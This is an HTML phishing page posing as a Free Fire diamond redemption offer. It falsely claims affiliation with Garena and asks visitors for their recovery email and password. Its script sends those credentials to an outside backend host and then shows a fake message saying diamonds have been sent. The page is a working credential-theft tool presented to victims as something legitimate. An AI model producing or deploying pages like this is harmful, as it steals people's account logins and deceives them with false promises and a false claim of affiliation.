<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Free Fire Diamond Redeem</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
    }

    body {
      height: 100vh;
      background: url('https://wallpapercave.com/wp/wp11281009.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      background: rgba(20, 20, 20, 0.85);
      border-radius: 15px;
      padding: 3rem 2rem;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 15px #ffbe0b;
      text-align: center;
    }

    h2 {
      color: #ffbe0b;
      margin-bottom: 1.5rem;
      font-size: clamp(24px, 5vw, 32px);
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 0.9rem;
      margin: 0.75rem 0;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      background: #1e1e1e;
      color: #fff;
      transition: 0.3s ease;
    }

    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: 2px solid #ffbe0b;
    }

    input[type="submit"] {
      background-color: #ffbe0b;
      color: black;
      border: none;
      padding: 1rem;
      width: 100%;
      font-size: 1rem;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 1rem;
    }

    input[type="submit"]:hover {
      background-color: #ffd60a;
    }

    .footer {
      margin-top: 1.5rem;
      font-size: 0.75rem;
      color: #ccc;
    }

    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.75);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background-color: #1e1e1e;
      color: #ffbe0b;
      padding: 2rem;
      border-radius: 10px;
      text-align: center;
      max-width: 300px;
      box-shadow: 0 0 15px #ffbe0b;
      animation: fadeIn 0.3s ease-in-out;
    }

    .modal-content p {
      margin-bottom: 1.5rem;
      font-size: 1rem;
    }

    .close-btn {
      padding: 0.5rem 1.5rem;
      background-color: #ffbe0b;
      color: #000;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    @media (max-width: 480px) {
      .container {
        padding: 2rem 1rem;
      }

      h2 {
        font-size: 1.5rem;
      }

      input[type="submit"] {
        font-size: 0.95rem;
        padding: 0.9rem;
      }

      .modal-content {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Redeem Free Fire Diamonds</h2>
    <form id="redeemForm">
      <input type="email" name="email" placeholder="Recovery Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="submit" value="Redeem Diamonds" />
    </form>
    <div class="footer">
      Affiliated with Garena.
    </div>
  </div>

  <!-- Custom Modal -->
  <div id="popupModal" class="modal">
    <div class="modal-content">
      <p>ðŸŽ‰ Diamonds have been sent to your ID.<br>Please check it!</p>
      <button class="close-btn" id="closePopup">OK</button>
    </div>
  </div>

  <script>
    const form = document.getElementById('redeemForm');
    const modal = document.getElementById('popupModal');
    const closeBtn = document.getElementById('closePopup');

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const email = this.querySelector('input[type="email"]').value.trim();
      const password = this.querySelector('input[type="password"]').value.trim();

    fetch('https://my-backend-1wis.onrender.com/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password })
})
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          document.getElementById('popupModal').style.display = 'flex';
          form.reset();
        }
      });
    });

    closeBtn.addEventListener('click', function() {
      modal.style.display = 'none';
    });

    window.addEventListener('click', function(e) {
      if (e.target === modal) {
        modal.style.display = 'none';
      }
    });
  </script>
</body>
</html>
